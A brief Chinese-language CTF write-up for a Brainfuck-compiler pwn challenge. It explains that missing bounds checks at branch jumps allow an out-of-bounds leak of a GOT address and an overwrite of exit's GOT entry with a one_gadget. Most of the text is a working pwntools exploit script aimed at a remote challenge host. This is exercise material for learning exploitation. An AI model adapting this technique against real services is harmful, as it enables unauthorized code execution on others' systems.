实现了一个brainfuck的编译器

在分支跳转处未进行边界判断，直接默认跳转时指针的相对偏移是安全的

```python
headb = self.head.codegen(module)
br1b = self.br1.codegen(module, (0, 0))
br2b = self.br2.codegen(module, (0, 0))
```

可以在分支处越界泄露出got表地址，劫持exit的got表到one_gadget,从而直接get shell

```python
from pwn import *
from time import sleep
p=remote("58.229.240.181",7777)
p.recvuntil('>>> ')
p.sendline("[]"+"<"*0x73+"[[.<]]")
s=p.recvuntil('>')[:-1]
s=s.rjust(8,'\x00')[::-1]
libc=u64(s)-1114432
onegad=libc+0x10a38c
p.sendline("[]"+"<"*0x4b+"[[,<]]")
sleep(1)
p.send(p64(onegad)[:-2][::-1])
p.sendline("<.")
p.interactive()
```

